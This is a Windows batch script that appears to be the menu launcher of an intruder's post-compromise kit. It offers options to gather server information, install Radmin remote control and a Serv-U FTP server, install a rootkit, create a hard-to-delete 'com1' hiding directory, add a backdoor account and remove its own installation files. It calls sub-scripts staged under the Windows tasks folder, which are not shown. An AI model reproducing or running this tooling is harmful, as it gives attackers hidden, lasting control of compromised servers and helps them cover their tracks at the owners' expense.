@echo off

if "%1"=="" goto null
if "%1"=="1" goto 2info
if "%1"=="2" goto 2radmin
if "%1"=="3" goto 2serv-u
if "%1"=="4" goto 2rootkit
if "%1"=="5" goto 2comdir
if "%1"=="6" goto 2backdoor
if "%1"=="7" goto 2del

:null
echo Usage: go.bat #
echo [1] Grabbing Server informations....
echo [2] Installing Radmin on Server.....
echo [3] Installing Serv-U on Server.....
echo [4] Installing Rootkit on server....
echo [5] Installing Com1 dir on Server...
echo [6] Installing backdoor account.....
echo [7] Delete Installation files.......
goto exit

:2info
echo this will Grabbing informations about the server, press CRTL+C to stop
pause
call %windir%\tasks\install\info\info.bat
goto exit

:2radmin
echo this will install radmin on your server, press CRTL+C to stop
pause
call %windir%\tasks\install\radmin\radmin.bat
goto exit

:2Serv-U
echo this will install Serv-U on your Server, press CRTL+C to stop
pause
call %windir%\tasks\install\serv-u\serv-u.bat
goto exit

:2rootkit
echo this will install rookit on your Server, press CRTL+C to stop
pause
call %windir%\tasks\install\rootkit\rootkit.bat
goto exit

:2comdir
echo this will make com1 dir on your Server (on selected drive), press CRTL+C to stop
pause
call %windir%\tasks\install\other\setup.bat
goto exit

:2backdoor
echo this will make backdoor account on Server, press CRTL+C to stop
call %windir%\tasks\install\other\accounts.bat
goto exit

:2del
echo this will remove all installation files form server, press CRTL+C to stop
call %windir%\tasks\install\remove.bat
goto exit

:exit